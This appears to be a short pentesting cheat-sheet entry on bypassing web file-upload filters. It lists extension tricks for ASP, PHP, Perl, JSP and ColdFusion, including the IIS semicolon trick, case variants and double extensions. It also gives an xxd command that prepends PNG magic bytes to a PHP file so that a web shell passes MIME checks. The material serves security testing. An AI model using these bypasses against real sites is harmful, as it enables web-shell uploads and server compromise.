---
title: upload-bypass
category: web
order: 1
---


# UPLOAD BYPASS:
https://www.owasp.org/index.php/Unrestricted_File_Upload  
https://soroush.secproject.com/blog/tag/unrestricted-file-upload/  
```
IIS 6.0 or below
Asp > upload as test.txt, copy or move file as test.asp;.txt

Php > upload as pHp / phP / test.php.jpg /

php - phtml, .php, .php3, .php4, .php5,.php7 and .inc

asp - asp, .aspx

perl - .pl, .pm, .cgi, .lib

jsp - .jsp, .jspx, .jsw, .jsv, and .jspf

Coldfusion - .cfm, .cfml, .cfc, .dbm
```

## image upload

As expected, the image gets rejected due to invalid MIME type. The magic bytes for PNG are “89 50 4E 47 0D 0A 1A 0A”, which can be added to the beginning of the shell.
```
echo '89 50 4E 47 0D 0A 1A 0A' | xxd -p -r > mime.php.png
```
